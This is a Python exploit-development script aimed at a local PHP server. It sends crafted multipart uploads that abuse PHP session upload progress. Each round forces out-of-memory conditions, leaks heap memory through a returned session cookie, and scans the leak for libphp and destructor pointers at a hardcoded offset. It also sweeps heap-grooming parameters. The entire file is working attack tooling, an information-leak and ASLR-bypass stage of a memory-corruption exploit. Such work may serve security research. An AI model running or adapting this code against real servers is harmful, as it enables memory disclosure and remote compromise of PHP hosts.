import os
import sys, time
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from exploit import Target, build_multipart, parse_cookie

URL = "http://127.0.0.1:18112/index.php"
dtor_offset = 0x49ec50
SID = b"attacksessionid0001"
t = Target(URL, timeout=120, verbose=False)

def filepart(): return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

def rotate():
    parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(),
              {"name": "big", "data": b"B" * (12 * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.3)
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    t.post(build_multipart(parts, b"BNDRY12345"), b"BNDRY12345", read_cap=65536, timeout=20)
    time.sleep(0.5)

def oom(nfields, big_mb, small_sz=1):
    parts = [{"name": f"p{i:04d}", "data": b"x" * small_sz} for i in range(nfields)]
    parts += [{"name": "PHPSESSID", "data": b"\x00"},
              {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}, filepart(),
              {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)}]
    t.post(build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=120)
    time.sleep(0.2)

def leak():
    parts = [{"name": "PHPSESSID", "data": SID}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
    for i in range(983):
        cnt = 16 if i == 406 else 1
        for j in range(cnt):
            parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * 16})
    resp = t.post(build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20)
    return parse_cookie(resp)

def check(raw, label):
    if not raw:
        print(f"{label}: NO COOKIE"); return
    ptrs = [int.from_bytes(raw[i:i+8], "little") for i in range(0, len(raw)-8, 8)]
    ptrs = [v for v in ptrs if 0x700000000000 <= v < 0x800000000000]
    libbase = 0x7a43d9480000
    libptrs = [v for v in ptrs if 0x7a43d9480000 <= v < 0x7a43da000000]
    dtor = any(v == libbase + dtor_offset for v in ptrs)
    # show the min chunk offset (to see where the leak lands)
    minoff = min((v & 0x1fffff) for v in ptrs if v & 0x1fffff != 0) if ptrs else 0
    print(f"{label}: {len(raw)}B ptrs={len(ptrs)} libphp={len(libptrs)} DTOR={'HIT' if dtor else '-'} minchunkoff=0x{minoff:x}")

sweeps = [
    (1001, 12, 1),    # baseline
    (1200, 12, 1),    # more small fields
    (1400, 12, 1),
    (1001, 16, 1),    # bigger big field
    (1001, 10, 1),    # smaller big field
    (1001, 12, 8),    # bigger small fields
]
for nf, mb, ss in sweeps:
    rotate()
    oom(nf, mb, ss)
    raw = leak()
    check(raw, f"oom(nf={nf},mb={mb},sz={ss})")
